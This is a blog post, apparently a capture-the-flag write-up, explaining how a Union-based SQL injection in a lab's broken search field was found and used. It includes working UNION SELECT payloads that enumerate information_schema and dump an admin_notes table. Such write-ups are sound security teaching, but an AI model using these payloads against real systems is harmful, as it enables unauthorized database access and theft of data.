---
layout: post
title: Infinity - SQL Injection - Broken Search
date: 2026-05-20 00:03:00 +0000
categories: [Writeups, Infinity, "SQL Injection"]
tags:
  - Infinity
author: mustafa_altayeb
subtitle: Manipulating POST Parameters for High Score
description: A walkthrough of exploiting a Union-based SQL Injection vulnerability in a broken search feature on Infinity platform. By identifying the correct number of columns and injecting into a POST parameter, we successfully dumped sensitive data from the database.
image: https://infinitylearning-images.s3.eu-west-2.amazonaws.com/Learning-Path-Challenge-Images/broken-search.webp
tag:
  - Infinity
  - Web_Security
  - SQLI
  - infinity
  - CTF
  - Web
  - HTTP
  - POST
  - SQLi
paginate: true
---

# Infinity — SQL Injection: Broken Search

## Overview

A web application exposes a search feature that passes user input directly into a SQL query without sanitization. The goal is to exploit this using Union-based SQL Injection to enumerate the database and dump sensitive data.

**Vulnerability:** Union-based SQL Injection  
**Parameter:** POST body — search field  
**Database:** MariaDB (MySQL)

---

## Step 1: Identify the Input Field

Open the challenge and locate the search input field.

![Input field](/assets/infinity/SQLI/1.png)

---

## Step 2: Test for SQL Injection

Inject a single quote `'` to break the SQL syntax. The application returns a MariaDB error — confirming the input is unsanitized and the backend is MySQL-compatible.

![SQL error response](/assets/infinity/SQLI/2.png)

---

## Step 3: Determine Number of Columns

Use `UNION SELECT` to find how many columns the original query returns. Increment until no error appears.

**1 column** → Error: `The used SELECT statements have a different number of columns`

![1 column error](/assets/infinity/SQLI/3.png)

**2 columns** → Still errors

![2 columns error](/assets/infinity/SQLI/5.png)

**3 columns** → Success. Numbers `2` and `3` are reflected in the response, confirming injectable positions.

![3 columns success](/assets/infinity/SQLI/6.png)

---

## Step 4: Enumerate the Database

With 3 columns confirmed, extract table names from `information_schema`.

```sql
' UNION SELECT 1,table_name,3 FROM information_schema.tables;-- -
```

Found a table: `admin_notes`

![Table enumeration](/assets/infinity/SQLI/9.png)

---

## Step 5: Dump Column Names

```sql
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='admin_notes';-- -
```

Columns found: `id`, `note`

![Column enumeration](/assets/infinity/SQLI/10.png)

---

## Step 6: Dump the Data

```sql
' UNION SELECT 1,note,3 FROM admin_notes;-- -
```

Successfully retrieved the contents of `admin_notes`.

![Data dump](/assets/infinity/SQLI/11.png)

---

## Key Takeaways

- Always test with `'` and `"` — different databases react differently to each.
- Column count detection is the first real step in any UNION-based attack; don't skip it.
- Reflected column positions tell you exactly where your output will appear — target those.
- `information_schema` is your map — tables first, then columns, then data.

---

Happy Hacking!  


Follow me: [LinkedIn](https://www.linkedin.com/in/t4t4r1s/) · [X](https://x.com/T4T4R1S)

<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style="border:none;"></iframe>


